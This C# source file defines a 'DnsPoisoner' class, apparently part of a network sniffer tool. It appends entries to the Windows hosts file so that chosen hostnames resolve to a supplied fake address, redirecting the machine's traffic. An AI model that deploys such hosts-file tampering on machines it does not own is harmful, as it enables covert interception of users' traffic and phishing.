namespace SupremaSniffer
{
    internal class DnsPoisoner
    {
        private string fakeHost;
        private List<string> hosts = new List<string>();

        public DnsPoisoner(string fakeHost, string[] hosts)
        {
            this.fakeHost = fakeHost;
            this.hosts.AddRange(hosts);
        }

        public void poison()
        {
            string localDnsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
            List<string> hostsFileFormattedHosts = new List<string>();
            string[] theirHosts = File.ReadAllLines(localDnsFile);
            foreach(var myHost in hosts)
            {
                bool hostPresented = false;
                foreach(var theirHost in theirHosts)
                {
                    if (theirHost.Contains(myHost))
                    {
                        hostPresented = true;
                        break;
                    }
                }
                if (!hostPresented)
                {
                    hostsFileFormattedHosts.Add(fakeHost + "    " + myHost);
                } 
            }
            if (hostsFileFormattedHosts.Count > 0)
            {
                File.AppendAllText(localDnsFile, "\n");
                File.AppendAllLines(localDnsFile, hostsFileFormattedHosts);
            }
        }
    }
}
